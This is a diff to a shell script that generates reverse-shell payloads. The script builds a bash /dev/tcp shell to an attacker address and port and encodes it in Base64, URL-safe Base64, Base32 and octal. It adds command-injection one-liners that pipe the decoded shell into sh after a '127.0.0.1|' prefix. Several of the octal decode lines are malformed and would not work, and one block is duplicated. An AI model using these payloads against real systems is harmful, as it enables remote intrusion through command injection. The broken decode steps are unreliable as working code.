@@ -26,14 +26,57 @@ plain_payload="echo \"bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1\" | bash"
 echo "Plain Payload:"
 echo "${plain_payload}"
 
-# Generate the base64-encoded payload
+# Generate the Base64-encoded payload
 base64_payload=$(echo -n "${plain_payload}" | base64 -w 0)
 echo ""
 echo "Base64-Encoded Payload:"
 echo "${base64_payload}"
+echo "echo ${base64_payload}|base64 -d|sh"
+echo "127.0.0.1|echo+${base64_payload}|base64+-d|sh"
 
-# Generate the URL-safe base64-encoded payload
+# Generate the URL-safe Base64-encoded payload
 url_safe_payload=$(echo -n "${plain_payload}" | base64 -w 0 | sed -e 's/+/%2B/g' -e 's/=/%3D/g')
 echo ""
 echo "URL-Safe Base64-Encoded Payload:"
 echo "${url_safe_payload}"
+echo "127.0.0.1|echo+${url_safe_payload}|base64+-d|sh"
+
+# Generate the Base32-encoded payload
+base32_payload=$(echo -n "${plain_payload}" | base32)
+echo ""
+echo "Base32-Encoded Payload:"
+echo "${base32_payload}"
+echo "echo ${base32_payload}|base32 -d|sh"
+
+# Generate a ready-to-use one-liner for Base32
+echo ""
+echo "One-Liner for Base32:"
+echo "127.0.0.1|echo+${base32_payload}|base32+-d|sh"
+
+# Generate the Base8-encoded payload (octal representation)
+base8_payload=$(echo -n "${plain_payload}" | od -An -t o1 | tr -d ' \n') 
+echo "" 
+echo "Base8-Encoded Payload (Octal Representation):" 
+echo "${base8_payload}" 
+echo "echo ${base8_payload} | od -An -t c | sh"
+
+# Generate a ready-to-use one-liner for Base8 
+echo "" echo "One-Liner for Base8:" 
+echo "127.0.0.1|echo+${base8_payload}|xxd --ps -r|sh"
+
+# Generate the plain reverse shell payload
+plain_payload="echo \"bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1\" | bash" 
+echo "Plain Payload:" 
+echo "${plain_payload}" 
+
+# Generate the Base8-encoded payload (octal representation)
+base8_payload=$(echo -n "echo \"bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1\" | bash" | od -b -An -w9999 | sed 's! !\\!g' | sed 's!\\[0]!\\!g') 
+echo "" 
+echo "Base8-Encoded Payload (Octal Representation):" 
+echo "${base8_payload}" 
+echo "echo ${base8_payload} | od -b -An -w9999 | sed 's!\\!g' | sed 's!\\[0]!\\!g' | sh"
+
+# Generate a ready-to-use one-liner for Base8 
+echo "" 
+echo "One-Liner for Base8:" 
+echo "127.0.0.1|echo+${base8_payload}|sed 's!\\[0]!\\!g'|sh"
